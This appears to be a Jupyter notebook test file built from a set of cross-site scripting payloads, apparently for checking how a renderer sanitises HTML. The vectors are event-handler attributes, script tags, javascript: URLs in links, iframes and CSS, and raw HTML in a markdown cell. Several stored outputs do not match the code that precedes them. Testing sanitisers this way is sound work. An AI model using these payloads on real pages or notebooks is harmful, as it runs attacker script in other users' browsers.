# %%
from IPython.display import HTML
HTML('<img src=x onerror=alert(1)>')
# Out:
# <img src=x onerror=alert(document.domain)>

# %%
HTML('<script>alert(1)</script>')
# Out:
# <script>alert(document.domain)</script>

# %%
HTML('<svg onload=alert(1)>')
# Out:
# <svg onload=alert(document.domain)><text>xss</text></svg>

# %%
HTML('<details ontoggle=alert(1) open>')
# Out:
# <details ontoggle=alert(document.domain) open><summary>xss</summary></details>

# %%
HTML('<a href=javascript:alert(1)>click</a>')
# Out:
# <a href='javascript:alert(document.domain)'>click me</a>

# %%
HTML('<iframe>')
# Out:
# <iframe src='javascript:alert(document.domain)'></iframe>

# %%
HTML('css xss')
# Out:
# <style>@import 'javascript:alert(1)'</style><div style='background:url(javascript:alert(1))'>css</div>

# %% [markdown]
# # Markdown cell XSS
# <img src=x onerror=alert(document.domain)>
# <script>alert(1)</script>
